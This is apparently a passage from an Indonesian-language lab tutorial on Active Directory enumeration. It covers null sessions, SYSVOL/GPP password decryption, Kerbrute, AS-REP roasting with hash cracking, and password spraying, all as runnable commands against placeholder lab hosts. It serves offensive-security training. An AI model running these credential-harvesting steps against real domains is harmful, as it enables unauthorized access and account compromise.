[ ] 19. SMB null session tested
[ ] 20. RPC null session tested
[ ] 21. Anonymous shares recorded
[ ] 22. SYSVOL checked
[ ] 23. NETLOGON checked
[ ] 24. Users collected
[ ] 25. Groups collected
[ ] 26. Computers collected
[ ] 27. Kerbrute username enumeration attempted
[ ] 28. AS-REP roasting checked
[ ] 29. Any obtained hashes preserved
[ ] 30. Credentials validated
[ ] 31. Password policy checked
[ ] 32. Authenticated SMB enumeration completed
[ ] 33. Authenticated LDAP enumeration completed
[ ] 34. Group memberships examined
[ ] 35. Computer inventory created
[ ] 36. SMB shares enumerated
[ ] 37. Interesting share files reviewed
[ ] 38. GPO objects identified
[ ] 39. GPP-related files searched
[ ] 40. SPNs enumerated
[ ] 41. Trust information noted
[ ] 42. Service accounts identified
[ ] 43. All raw output saved
[ ] 44. BloodHound collection prepared
[ ] 45. BloodHound ZIP/JSON preserved
[ ] 46. Enumeration facts summarized
[ ] 47. Unknowns explicitly listed
[ ] 48. Next hypotheses written
[ ] 49. No destructive action performed
[ ] 50. Ready for File 36
```

---

# 🔄 ONE-PAGE AD ENUM FLOW

```text
                  AD/DC CONFIRM
                       │
                       ▼
                  DOMAIN INFO
                       │
                       ▼
        ┌──────────────┼──────────────┐
        │              │              │
        ▼              ▼              ▼
      SMB             LDAP           RPC
        │              │              │
        ▼              ▼              ▼
     NULL?          ANONYMOUS?       NULL?
        │              │              │
        └──────────────┼──────────────┘
                       ▼
                  USERNAMES
                       │
                       ▼
                  KERBRUTE
                       │
                       ▼
                AS-REP ROAST?
                  ┌────┴────┐
                 NO        YES
                  │          │
                  │          ▼
                  │       HASH
                  │          │
                  │          ▼
                  │       CRACK
                  │          │
                  └────┬─────┘
                       ▼
                  CREDENTIAL
                       │
                       ▼
             AUTHENTICATED ENUM
                       │
        ┌──────────────┼───────────────┐
        │              │               │
        ▼              ▼               ▼
      USERS          GROUPS         COMPUTERS
        │              │               │
        └──────────────┼───────────────┘
                       ▼
                     SMB
                       │
          ┌────────────┼────────────┐
          ▼            ▼            ▼
        SHARES        GPO          SPNs
          │            │            │
          └────────────┼────────────┘
                       ▼
                    TRUSTS
                       │
                       ▼
                 BLOODHOUND
                       │
                       ▼
                  FILE 36
```

---

# 🧠 OUTPUT ANALYSIS — PEMULA

## Kalau lihat ini:

```text
domain:CORP.LOCAL
```

Lakukan:

```bash
# Set the discovered domain
export DOMAIN="corp.local"
```

---

## Kalau lihat ini:

```text
name:DC01
```

Lakukan:

```bash
# Record the DC hostname in your notes
echo "DC01" >> ~/labs/ad/recon/dc-hostnames.txt
```

---

## Kalau lihat ini:

```text
88/tcp open kerberos-sec
```

Pikir:

```text
Kerberos
 ↓
domain authentication
 ↓
username enumeration
 ↓
AS-REP possibility
```

---

## Kalau lihat ini:

```text
389/tcp open ldap
```

Pikir:

```text
Directory Service
 ↓
RootDSE
 ↓
Base DN
 ↓
users/groups/computers
```

---

## Kalau lihat ini:

```text
445/tcp open microsoft-ds
```

Pikir:

```text
SMB
 ↓
shares
 ↓
null session
 ↓
SYSVOL
 ↓
NETLOGON
```

---

## Kalau lihat ini:

```text
3268/tcp open globalcatLDAP
```

Pikir:

```text
Global Catalog
 ↓
forest-wide directory information
```

---

## Kalau lihat ini:

```text
$krb5asrep$
```

Pikir:

```text
AS-REP roastable
 ↓
offline cracking
 ↓
possible credential
```

---

## Kalau lihat ini:

```text
Domain Admins
```

Jangan langsung berpikir:

```text
"I can become admin."
```

Tanyakan:

```text
Who belongs to this group?
Direct?
Nested?
Can one of those members be controlled?
```

---

## Kalau lihat ini:

```text
svc_backup
```

Jangan berhenti pada username.

Tanyakan:

```text
Is it a service account?
Does it have SPN?
Description?
Last password set?
Group membership?
Where is it used?
```

---

# 🔥 MASTER QUESTIONS

Setelah setiap enumeration, jawab pertanyaan berikut.

```text
1. What domain am I in?
2. What is the DC?
3. What users exist?
4. What groups exist?
5. Who is privileged?
6. What computers exist?
7. What shares exist?
8. Can I read SYSVOL?
9. Can I read NETLOGON?
10. What does the password policy allow?
11. Are any users AS-REP roastable?
12. Are there service accounts?
13. Which users have SPNs?
14. What GPOs exist?
15. What trusts exist?
16. What credentials have I obtained?
17. What can those credentials access?
18. What relationships am I missing?
19. What information should go into BloodHound?
20. What is my next hypothesis?
```

---

# 🚦 WHEN TO STOP ENUMERATING MANUALLY

Berhenti melakukan manual enumeration sementara ketika Anda sudah punya:

```text
[✓] Domain
[✓] DC
[✓] Users
[✓] Groups
[✓] Computers
[✓] Shares
[✓] Password policy
[✓] SPNs
[✓] GPO information
[✓] Trust information
[✓] At least one valid credential
```

Kemudian:

```text
raw facts
   ↓
BloodHound
   ↓
relationships
   ↓
attack paths
```

---

# 🩸 LANJUT KE FILE 36

## Kenapa BloodHound?

Manual enumeration menghasilkan daftar:

```text
Alice
Bob
svc_backup
DC01
WEB01
Domain Admins
Helpdesk
SPN
GPO
ACL
```

Masalahnya:

```text
human brain
     ↓
sulit melihat semua relationship
```

BloodHound mengubah data tersebut menjadi graph.

Konsep:

```text
USER
 │
 ├── MEMBER OF → GROUP
 │
 ├── HAS SESSION ON → COMPUTER
 │
 ├── CAN RDP → COMPUTER
 │
 ├── CAN PSREMOTE → COMPUTER
 │
 └── HAS ACL → OBJECT
```

Sehingga pertanyaan berubah dari:

```text
"What objects exist?"
```

menjadi:

```text
"How can I move from my current user to a privileged target?"
```

---

# 🎒 Apa yang Dibawa dari File 35 ke File 36?

Bawa:

```text
DOMAIN
DC_IP
DC_HOSTNAME
USERNAME
PASSWORD
users.txt
groups.txt
computers.txt
shares.txt
SPNs
GPOs
trusts
BloodHound ZIP/JSON
```

Contoh environment:

```bash
# Set the final lab environment variables before BloodHound work
export DOMAIN="corp.local"
export DC_IP="10.10.10.10"
export USERNAME="svc_backup"
export PASSWORD="LAB_PASSWORD"
```

Lalu:

```text
File 35
   ↓
authenticated enumeration
   ↓
BloodHound collection
   ↓
File 36
   ↓
graph analysis
   ↓
attack path
```

---

# 🧠 FINAL AD MUSCLE MEMORY

```text
NMAP
→ confirm 88/389/445/3268
→ identify DC
→ identify domain
→ RootDSE
→ SMB null
→ LDAP anonymous
→ RPC null
→ enum4linux-ng
→ collect usernames
→ Kerbrute
→ AS-REP
→ credentials
→ validate credentials
→ users
→ groups
→ computers
→ shares
→ SYSVOL
→ NETLOGON
→ password policy
→ GPO
→ SPN
→ trusts
→ BloodHound collection
→ FILE 36
```

---

# 🏁 FINAL MENTAL MODEL

```text
            DISCOVER
                │
                ▼
              DOMAIN
                │
                ▼
               USERS
                │
                ▼
              GROUPS
                │
                ▼
            COMPUTERS
                │
                ▼
              SHARES
                │
                ▼
             POLICIES
                │
                ▼
               SPNs
                │
                ▼
              TRUSTS
                │
                ▼
           CREDENTIALS
                │
                ▼
       AUTHENTICATED ACCESS
                │
                ▼
          BLOODHOUND DATA
                │
                ▼
             ATTACK PATH
```

> **Core rule:**  
> `AD Enumeration bukan mencari satu "magic exploit".`
> 
> Tujuan utamanya adalah membangun **peta domain**:
> 
> ```text
> WHO
> WHAT
> WHERE
> GROUP
> ACCESS
> SERVICE
> TRUST
> POLICY
> ```
> 
> Setelah peta cukup lengkap, barulah BloodHound membantu menjawab pertanyaan yang lebih sulit: **jalur mana yang menghubungkan posisi Anda sekarang menuju privilege yang lebih tinggi?**

---

# [🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.10.10"        # IP Domain Controller
export DOMAIN="corp.local"          # Domain (isi setelah diketahui)
export DC_HOSTNAME="DC01"           # Hostname DC (isi setelah diketahui)
export BASE_DN="DC=corp,DC=local"   # LDAP Base DN (isi setelah diketahui)
export USERNAME=""                  # Isi setelah dapat creds
export PASSWORD=""                  # Isi setelah dapat creds
export LHOST="10.10.14.5"          # IP tun0 kamu

mkdir -p ~/labs/ad/{recon,users,groups,computers,shares,ldap,kerberos,bloodhound,evidence}
cd ~/labs/ad

echo "[*] Target: $TARGET | Domain: $DOMAIN"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.10.10 | Domain: corp.local
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI AD ENVIRONMENT

## ═══════════════════════════════════════

> **Tujuan:** Pastikan target adalah Domain Controller sebelum membuang waktu dengan tool AD-specific.

### Langkah 0.1 — Nmap Port Scan (Deteksi AD Signature)

Bash

```
# Command 1: Scan semua port AD sekaligus
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269 $TARGET -oN ~/labs/ad/recon/nmap_ad_ports.txt

# Command 2: Jalankan NSE scripts untuk fingerprint lebih detail
nmap -Pn -p 88,389,445,636,3268,3269 \
    --script smb-os-discovery,smb2-security-mode,ldap-rootdse \
    $TARGET -oN ~/labs/ad/recon/nmap_ad_scripts.txt
```

**OUTPUT BERHASIL ✅ — Strong AD Indicator (semua port open):**

text

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
```

**Cara baca dan tindakan:**

|Port|Arti|Tindakan|
|---|---|---|
|88 open|Kerberos = AD Auth|AS-REP Roasting possible|
|389 open|LDAP = Directory|Query users/groups/computers|
|445 open|SMB = File sharing|Null session, share enum|
|3268 open|Global Catalog|Forest-wide queries|
|636/3269 open|LDAPS|Encrypted LDAP (backup option)|

➡️ **88 + 389 + 445 + 3268 semua open = SANGAT KUAT indicator DC.** Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — Partial AD (hanya beberapa port):**

text

```
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
```

➡️ Masih kemungkinan DC, lanjut ke **Langkah 0.2** untuk konfirmasi.

**OUTPUT GAGAL ❌ — Port 88 dan 389 closed/filtered:**

text

```
88/tcp   closed kerberos-sec
389/tcp  closed ldap
445/tcp  open   microsoft-ds
```

➡️ Ini kemungkinan BUKAN Domain Controller, hanya Windows member server atau workstation.  
➡️ Cek apakah ada DC lain di network: `nmap -Pn -p 88 10.10.10.0/24`  
➡️ Atau pindah ke **SMB workflow** → `<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`

---

### Langkah 0.2 — NetExec SMB Fingerprint (Cepat, Info Lengkap)

Bash

```
# Command 1: Basic fingerprint (paling cepat)
nxc smb $TARGET

# Command 2: Jika nxc tidak ada, pakai crackmapexec
crackmapexec smb $TARGET

# Command 3: Jika keduanya tidak ada
nmap -Pn -p 445 --script smb-os-discovery $TARGET
```

**OUTPUT BERHASIL ✅ — Confirmed DC:**

text

```
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:CORP.LOCAL) (signing:True) (SMBv1:False)
```

**Cara baca output — CATAT SEMUA:**

|Field|Nilai Contoh|Tindakan|
|---|---|---|
|`Windows Server 2019`|OS Version|Build 17763 = Server 2019|
|`name:DC01`|Hostname|Tambah ke `/etc/hosts`|
|`domain:CORP.LOCAL`|Domain|Set `$DOMAIN` variable|
|`signing:True`|SMB Signing ON|NTLM Relay TIDAK bisa|
|`signing:False`|SMB Signing OFF|**NTLM Relay possible!** → catat untuk Fase 7|
|`SMBv1:True`|Legacy SMB|Cek EternalBlue → `<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>`|

Bash

```
# LANGSUNG SET VARIABLE setelah dapat info
export DOMAIN="corp.local"
export DC_HOSTNAME="DC01"
export BASE_DN="DC=corp,DC=local"

# Tambahkan ke /etc/hosts untuk resolusi nama
echo "$TARGET $DC_HOSTNAME.$DOMAIN $DC_HOSTNAME $DOMAIN" | sudo tee -a /etc/hosts

# Verifikasi resolusi
ping -c 1 $DC_HOSTNAME.$DOMAIN
```

**OUTPUT GAGAL ❌ — Connection refused:**

text

```
SMB  10.10.10.10  445  [!] Connection refused
```

➡️ Port 445 diblokir atau host down.

Bash

```
# Coba port 139
nmap -Pn -p 139 $TARGET
smbclient -p 139 -N -L //$TARGET/

# Coba dengan -Pn (bypass host discovery)
nmap -Pn -sS -p 445 --source-port 53 $TARGET
```

---

### Langkah 0.3 — LDAP RootDSE Query (Konfirmasi Domain)

Bash

```
# Command 1: Query RootDSE anonymously
ldapsearch -x \
    -H "ldap://$TARGET" \
    -s base \
    -b "" \
    namingContexts defaultNamingContext rootDomainNamingContext

# Command 2: Lebih verbose
ldapsearch -x \
    -H "ldap://$TARGET" \
    -s base \
    -b "" \
    "*"
```

**OUTPUT BERHASIL ✅:**

text

```
dn:
namingContexts: DC=corp,DC=local
defaultNamingContext: DC=corp,DC=local
rootDomainNamingContext: DC=corp,DC=local
```

➡️ Update variable:

Bash

```
export BASE_DN="DC=corp,DC=local"
export DOMAIN="corp.local"
echo "[*] Confirmed AD Domain: $DOMAIN | Base DN: $BASE_DN"
```

**OUTPUT GAGAL ❌ — Can't contact LDAP server:**

text

```
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
```

➡️ Periksa port terlebih dahulu:

Bash

```
nmap -Pn -p 389 $TARGET
# Jika closed → LDAP tidak tersedia dari posisi kamu
# Jika open → mungkin firewall rule yang ketat, coba LDAPS
ldapsearch -x -H "ldaps://$TARGET" -s base -b "" namingContexts
```

---

## ═══════════════════════════════════════

## FASE 1: UNAUTHENTICATED ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Kumpulkan sebanyak mungkin informasi TANPA credentials. Sering ada user list, domain info, bahkan password di sini.

### Langkah 1.1 — SMB Null Session (Anonymous Access)

Bash

```
# Command 1: List shares tanpa credentials
smbclient -N -L //$TARGET/

# Command 2: NetExec anonymous check
nxc smb $TARGET -u '' -p '' --shares

# Command 3: Guest access check
nxc smb $TARGET -u 'guest' -p '' --shares

# Command 4: smbmap untuk lihat permissions
smbmap -H $TARGET
```

**OUTPUT BERHASIL ✅ — Shares accessible:**

text

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

**Tindakan berdasarkan share yang ditemukan:**

|Share|Prioritas|Action|
|---|---|---|
|`SYSVOL`|🔴 TINGGI|Cek GPP credentials, scripts → Langkah 1.2|
|`NETLOGON`|🔴 TINGGI|Cek logon scripts yang mungkin punya credentials|
|`C$` accessible|🚨 KRITIS|Langsung admin! → Fase 5 exploitation|
|Share custom|🟡 MEDIUM|Loot semua file → Langkah 1.3|

**OUTPUT GAGAL ❌ — NT_STATUS_ACCESS_DENIED:**

text

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

➡️ Anonymous SMB diblokir. Coba variasi:

Bash

```
# Variasi 1: Username sembarang (kadang work di Samba misconfiguration)
smbclient -U 'nobody%' -L //$TARGET/

# Variasi 2: Paksa protocol lama
smbclient --option='client min protocol=NT1' -N -L //$TARGET/

# Variasi 3: Cek apakah RPC masih bisa
rpcclient -U "" -N $TARGET -c "srvinfo"
```

➡️ Jika semua gagal → skip ke **Langkah 1.4 (LDAP Anonymous)** dan **Langkah 1.5 (Kerbrute)**

---

### Langkah 1.2 — Explore SYSVOL (Cari GPP Credentials)

> SYSVOL adalah share yang hampir SELALU readable oleh semua authenticated user di domain, dan sering juga anonymous. Ini goldmine untuk credentials lama.

Bash

```
# Command 1: Connect dan list isi SYSVOL
smbclient -N //$TARGET/SYSVOL

# Di dalam prompt smbclient:
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls
smb: \> mget *
smb: \> exit

# Command 2: Alternative dengan smbmap
smbmap -H $TARGET -R SYSVOL

# Command 3: Mount SYSVOL di Linux
sudo mkdir -p /mnt/sysvol
sudo mount -t cifs "//$TARGET/SYSVOL" /mnt/sysvol -o "guest"
```

**OUTPUT BERHASIL ✅ — Dapat akses SYSVOL:**

text

```
smb: \> ls
  .                                   D        0  Mon Jan 10 12:00:00 2024
  ..                                  D        0  Mon Jan 10 12:00:00 2024
  CORP.LOCAL                          D        0  Mon Jan 10 12:00:00 2024
```

➡️ Cari file-file kritis:

Bash

```
# Cari GPP credentials (Groups.xml adalah jackpot!)
find ~/labs/ad/sysvol -name "Groups.xml" 2>/dev/null
find ~/labs/ad/sysvol -name "ScheduledTasks.xml" 2>/dev/null
find ~/labs/ad/sysvol -name "Services.xml" 2>/dev/null
find ~/labs/ad/sysvol -name "Printers.xml" 2>/dev/null

# Cari script yang mungkin ada credentials
find ~/labs/ad/sysvol \( -name "*.ps1" -o -name "*.bat" -o -name "*.cmd" \) 2>/dev/null

# Cari keyword credentials dalam semua file
grep -ri "password\|passwd\|cpassword\|credential" ~/labs/ad/sysvol 2>/dev/null | head -50
```

**OUTPUT BERHASIL ✅ — Ketemu Groups.xml (JACKPOT!):**

XML

```
<?xml version="1.0" encoding="utf-8"?>
<Groups>
  <User clsid="{...}" name="svc_backup" image="2" ...>
    <Properties action="U" newName="" fullName="" description=""
      cpassword="VPe/o9YRyz2cksnYRbNeqg0Cred..."
      changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" .../>
  </User>
</Groups>
```

➡️ **GPP password ditemukan! Decrypt dengan gpp-decrypt:**

Bash

```
# Install jika belum ada
sudo apt install -y gpp-decrypt

# Decrypt password
gpp-decrypt "VPe/o9YRyz2cksnYRbNeqg0Cred..."

# Output akan seperti:
# Password: Backup2023!

export USERNAME="svc_backup"
export PASSWORD="Backup2023!"
echo "$USERNAME:$PASSWORD" >> ~/labs/ad/evidence/found_creds.txt

# LANGSUNG validasi
nxc smb $TARGET -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"
```

**OUTPUT GAGAL ❌ — SYSVOL kosong atau tidak accessible:**

text

```
NT_STATUS_ACCESS_DENIED
```

➡️ Normal untuk target yang aman. Lanjut ke **Langkah 1.3 (NETLOGON)** dan **Langkah 1.4 (LDAP Anonymous)**

---

### Langkah 1.3 — Explore NETLOGON

Bash

```
# Connect ke NETLOGON
smbclient -N //$TARGET/NETLOGON

smb: \> ls
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
smb: \> exit

# Analisis file yang didownload
ls ~/labs/ad/
cat ~/labs/ad/*.ps1 2>/dev/null
cat ~/labs/ad/*.bat 2>/dev/null
grep -ri "password\|credential\|-pass" ~/labs/ad/ 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Ketemu credentials di script:**

PowerShell

```
# Contoh output dari logon.ps1
$username = "svc_scan"
$password = "ScanPass123!"
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
```

➡️ Simpan dan validasi credentials yang ditemukan.

---

### Langkah 1.4 — LDAP Anonymous Bind

Bash

```
# Command 1: Query users anonymously
ldapsearch -x \
    -H "ldap://$TARGET" \
    -b "$BASE_DN" \
    "(objectCategory=person)" \
    sAMAccountName userPrincipalName description 2>/dev/null \
    | tee ~/labs/ad/ldap/anon_users.txt

# Command 2: Query groups
ldapsearch -x \
    -H "ldap://$TARGET" \
    -b "$BASE_DN" \
    "(objectClass=group)" \
    sAMAccountName member 2>/dev/null \
    | tee ~/labs/ad/ldap/anon_groups.txt

# Command 3: Cari SPN (kandidat Kerberoasting)
ldapsearch -x \
    -H "ldap://$TARGET" \
    -b "$BASE_DN" \
    "(servicePrincipalName=*)" \
    sAMAccountName servicePrincipalName 2>/dev/null
```

**OUTPUT BERHASIL ✅ — LDAP anonymous bind berhasil:**

text

```
dn: CN=Alice Admin,CN=Users,DC=corp,DC=local
sAMAccountName: alice
userPrincipalName: alice@corp.local
description: Helpdesk Administrator

dn: CN=svc_backup,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
description: Backup Service Account - Password: Backup2023!   ← JACKPOT!
```

➡️ Catat semua user yang ditemukan dan cek description field!

Bash

```
# Extract usernames
grep "^sAMAccountName:" ~/labs/ad/ldap/anon_users.txt | awk '{print $2}' | sort -u > ~/labs/ad/users/usernames.txt
cat ~/labs/ad/users/usernames.txt

# Cek description field yang mungkin punya password
grep -i "description:" ~/labs/ad/ldap/anon_users.txt | grep -iv "^#"
```

**OUTPUT GAGAL ❌ — Anonymous bind ditolak untuk subtree:**

text

```
# No entries found
# atau
ldap_bind: Inappropriate authentication (48)
```

➡️ Anonymous LDAP diblokir untuk directory queries (tapi RootDSE mungkin masih bisa).  
➡️ RootDSE success ≠ full anonymous LDAP — ini NORMAL untuk environment yang aman.  
➡️ Lanjut ke **Langkah 1.5 (RPC)** dan **Langkah 1.6 (Kerbrute)**

---

### Langkah 1.5 — RPC Null Session

Bash

```
# Command 1: Connect dengan null session
rpcclient -U "" -N $TARGET

# Command 2: Jika Command 1 gagal, coba dengan username kosong berbeda
rpcclient -U "%" $TARGET

# Di dalam prompt rpcclient (jika berhasil masuk):
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
rpcclient $> getdompwinfo
rpcclient $> querydominfo
rpcclient $> quit
```

**OUTPUT BERHASIL ✅ — Masuk ke prompt rpcclient:**

text

```
rpcclient $>
```

**Output `enumdomusers` yang dicari:**

text

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[alice] rid:[0x452]
user:[bob] rid:[0x453]
user:[svc_backup] rid:[0x454]
user:[svc_sql] rid:[0x455]
```

**Output `querydispinfo` — Cek DESCRIPTION FIELD:**

text

```
index: 0x4 RID: 0x454 acb: 0x00000210
name: svc_backup
desc: Password: Backup2023!    ← !! PASSWORD DI DESCRIPTION !!
```

➡️ **SIMPAN USERS:**

Bash

```
# Extract usernames dari output rpcclient
rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null \
    | grep -oP "(?<=\[)[^\]]+(?=\])" \
    | grep -v "0x" \
    > ~/labs/ad/users/usernames.txt

echo "[*] Total users found: $(wc -l < ~/labs/ad/users/usernames.txt)"
cat ~/labs/ad/users/usernames.txt
```

**Output `getdompwinfo` — PASSWORD POLICY:**

text

```
min_password_length: 8
password_properties: 0x00000001
lockout_threshold: 5       ← MAKSIMAL 4 percobaan aman!
reset_lockout_count: 30    ← Reset setiap 30 menit
lockout_duration: 30       ← Lock 30 menit
```

> ⚠️ **CATAT LOCKOUT POLICY INI** sebelum spraying! Dengan threshold 5, spray MAKSIMAL 3 password saja.

**OUTPUT GAGAL ❌ — NT_STATUS_ACCESS_DENIED:**

text

```
Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

➡️ Null session RPC ditolak. Coba:

Bash

```
# Alternatif 1: RID Brute via NetExec
nxc smb $TARGET -u '' -p '' --rid-brute 10000 2>/dev/null | tee ~/labs/ad/users/rid_brute.txt
grep "SidTypeUser" ~/labs/ad/users/rid_brute.txt | awk '{print $6}' | cut -d'\' -f2 > ~/labs/ad/users/usernames.txt

# Alternatif 2: enum4linux-ng (all-in-one)
enum4linux-ng -A $TARGET | tee ~/labs/ad/recon/enum4linux.txt
```

---

### Langkah 1.6 — enum4linux-ng (Comprehensive Unauthenticated Scan)

Bash

```
# All-in-one scan (SMB + LDAP + RPC sekaligus)
enum4linux-ng -A $TARGET | tee ~/labs/ad/recon/enum4linux.txt

# Jika enum4linux-ng tidak ada
enum4linux -A $TARGET | tee ~/labs/ad/recon/enum4linux.txt
```

**OUTPUT BERHASIL ✅ — Comprehensive output:**

text

```
[*] Target Information
[*] Target: 10.10.10.10
[*] NetBIOS domain name: CORP
[*] NetBIOS computer name: DC01
[*] FQDN: DC01.corp.local
[*] OS: Windows Server 2019

[*] Enumerating Workgroup/Domain
[+] Domain: CORP
[+] SID: S-1-5-21-111111111-222222222-333333333

[*] Enumerating Users
user:[alice]
user:[bob]
user:[svc_backup]

[*] Enumerating Shares
ADMIN$, C$, IPC$, NETLOGON, SYSVOL
```

➡️ Parse hasil:

Bash

```
# Extract domain SID (berguna untuk lateral movement nanti)
grep "SID:" ~/labs/ad/recon/enum4linux.txt

# Extract users jika belum punya
grep "^user:\[" ~/labs/ad/recon/enum4linux.txt | grep -oP "(?<=\[)[^\]]+" > ~/labs/ad/users/usernames.txt
```

---

### Langkah 1.7 — Kerbrute Username Enumeration

> Bahkan tanpa anonymous access ke SMB/LDAP/RPC, Kerberos sering membocorkan username validity.

Bash

```
# Siapkan wordlist username untuk test
# Jika belum punya users.txt, gunakan wordlist umum
ls /usr/share/seclists/Usernames/Names/ 2>/dev/null
ls /usr/share/wordlists/ 2>/dev/null

# Command 1: Test dengan users.txt yang sudah ada
kerbrute userenum \
    --dc $TARGET \
    -d $DOMAIN \
    ~/labs/ad/users/usernames.txt \
    | tee ~/labs/ad/kerberos/kerbrute_valid.txt

# Command 2: Jika belum punya users.txt, test dengan common names
kerbrute userenum \
    --dc $TARGET \
    -d $DOMAIN \
    /usr/share/seclists/Usernames/Names/names.txt \
    | tee ~/labs/ad/kerberos/kerbrute_from_wordlist.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[+] VALID USERNAME:  alice@corp.local
[+] VALID USERNAME:  bob@corp.local
[+] VALID USERNAME:  svc_backup@corp.local
[+] VALID USERNAME:  administrator@corp.local
[-] bob2@corp.local
```

➡️ Extract valid users:

Bash

```
grep "VALID USERNAME" ~/labs/ad/kerberos/kerbrute_valid.txt \
    | awk '{print $NF}' \
    | cut -d'@' -f1 \
    | sort -u > ~/labs/ad/users/valid_users.txt

echo "[*] Valid users confirmed: $(wc -l < ~/labs/ad/users/valid_users.txt)"
```

**OUTPUT GAGAL ❌ — Semua username invalid:**

text

```
[-] alice@corp.local
[-] bob@corp.local
```

➡️ Kemungkinan: domain name salah, DC IP salah, atau DNS issue.

Bash

```
# Verifikasi domain name
ping -c 1 $DOMAIN
nslookup $DOMAIN $TARGET

# Coba dengan FQDN DC
kerbrute userenum --dc $DC_HOSTNAME.$DOMAIN -d $DOMAIN ~/labs/ad/users/usernames.txt
```

---

### Langkah 1.8 — AS-REP Roasting (No Credentials Needed!)

> Jika user tidak require Kerberos pre-authentication, kita bisa minta AS-REP hash tanpa password!

Bash

```
# Command 1: Test semua valid users
impacket-GetNPUsers "$DOMAIN/" \
    -dc-ip $TARGET \
    -usersfile ~/labs/ad/users/valid_users.txt \
    -format hashcat \
    -outputfile ~/labs/ad/kerberos/asrep_hashes.txt \
    -no-pass

# Command 2: Verifikasi output
cat ~/labs/ad/kerberos/asrep_hashes.txt

# Command 3: Jika tidak punya users.txt, coba langsung
impacket-GetNPUsers "$DOMAIN/" \
    -dc-ip $TARGET \
    -no-pass \
    -format hashcat
```

**OUTPUT BERHASIL ✅ — AS-REP hash didapat:**

text

```
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3d4e5f6...longhashere...
```

➡️ **CRACK HASH SEKARANG:**

Bash

```
# Method 1: Hashcat (lebih cepat dengan GPU)
hashcat -m 18200 ~/labs/ad/kerberos/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/labs/ad/kerberos/asrep_cracked.txt

# Method 2: John (CPU)
john ~/labs/ad/kerberos/asrep_hashes.txt \
    --wordlist=/usr/share/wordlists/rockyou.txt

# Lihat hasil
cat ~/labs/ad/kerberos/asrep_cracked.txt
john ~/labs/ad/kerberos/asrep_hashes.txt --show
```

**Output cracking berhasil:**

text

```
$krb5asrep$23$svc_backup@...:Backup2023!
```

Bash

```
export USERNAME="svc_backup"
export PASSWORD="Backup2023!"
echo "$USERNAME:$PASSWORD" >> ~/labs/ad/evidence/found_creds.txt
```

➡️ **Langsung ke FASE 2 — Authenticated Enumeration!**

**OUTPUT GAGAL ❌ — Tidak ada AS-REP roastable account:**

text

```
[-] User alice doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bob doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

➡️ Tidak ada user yang vulnerable ke AS-REP. Normal untuk environment yang dikonfigurasi dengan baik.  
➡️ Lanjut ke **Langkah 1.9 — Password Spraying**

---

### Langkah 1.9 — Password Spraying (HATI-HATI LOCKOUT!)

> **WAJIB CEK PASSWORD POLICY DULU** sebelum spray! (dari rpcclient getdompwinfo di Langkah 1.5)

Bash

```
# Siapkan password list berdasarkan context
cat > ~/labs/ad/creds/spray_passwords.txt << 'EOF'
Password123!
Welcome2024!
Summer2024!
Winter2024!
Company2024!
Admin2024!
corp.local2024
CORP2024!
EOF

# Tambahkan nama domain/perusahaan sebagai kandidat
echo "Corp2024!" >> ~/labs/ad/creds/spray_passwords.txt
echo "DC012024!" >> ~/labs/ad/creds/spray_passwords.txt

# SPRAY - dengan --continue-on-success untuk tidak berhenti saat ketemu 1
nxc smb $TARGET \
    -u ~/labs/ad/users/valid_users.txt \
    -p ~/labs/ad/creds/spray_passwords.txt \
    --continue-on-success \
    -d $DOMAIN \
    | tee ~/labs/ad/creds/spray_results.txt

# Filter yang berhasil
grep "\[+\]" ~/labs/ad/creds/spray_results.txt
```

**OUTPUT BERHASIL ✅ — Credentials valid:**

text

```
SMB  10.10.10.10  445  DC01  [+] CORP\alice:Welcome2024!
```

Bash

```
export USERNAME="alice"
export PASSWORD="Welcome2024!"
echo "$USERNAME:$PASSWORD" >> ~/labs/ad/evidence/found_creds.txt
```

